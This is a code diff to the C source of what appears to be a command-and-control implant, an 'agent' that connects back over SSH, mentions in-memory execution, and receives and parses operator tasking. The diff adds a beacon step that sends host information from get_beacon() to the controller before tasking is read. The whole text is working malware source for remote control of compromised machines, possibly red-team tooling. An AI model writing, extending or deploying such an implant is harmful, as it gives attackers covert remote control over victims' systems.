@@ -1,6 +1,7 @@
 #include "agent.h"
 #include "config.h"
 #include "b64.h"
+#include "beacon.h"
 
 // Agent in-memory execution definitions
 #ifdef _WIN32
@@ -199,7 +200,9 @@ int func_loop(ssh_session session)
 	/* Primary function loop */
 	// Initialize vars
   	ssh_channel channel;
-  	int rc;
+	int rc;
+	char tmp[3];
+	char *beacon = NULL;;
 	char tasking[2048];
 	int nbytes;
 
@@ -238,6 +241,27 @@ int func_loop(ssh_session session)
 
 	printf("Identified as an agent\n");
 	rc = ssh_channel_write(channel, "1", 2);
+	if (rc == SSH_ERROR){
+		printf("Caught ssh error: %s\n", ssh_get_error(channel));
+		ssh_channel_free(channel);
+    	return rc;
+	}
+
+	rc = ssh_channel_read(channel, tmp, 3, 0);
+	if (rc == SSH_ERROR){
+		printf("Caught ssh error: %s\n", ssh_get_error(channel));
+		ssh_channel_free(channel);
+    	return rc;
+	}
+
+	beacon = get_beacon();
+	
+	rc = ssh_channel_write(channel, beacon, strlen(beacon));
+	if (rc == SSH_ERROR){
+		printf("Caught ssh error: %s\n", ssh_get_error(channel));
+		ssh_channel_free(channel);
+    	return rc;
+	}
 
 	printf("Waiting for read...\n");
 	nbytes = ssh_channel_read(channel, tasking, sizeof(tasking), 0);
@@ -247,7 +271,7 @@ int func_loop(ssh_session session)
     	ssh_channel_close(channel);
     	ssh_channel_free(channel);
     	return SSH_ERROR;
-	}		
+	}	
 
 	printf("Read data: %s\n", tasking);
 	parse_tasking(tasking, channel);
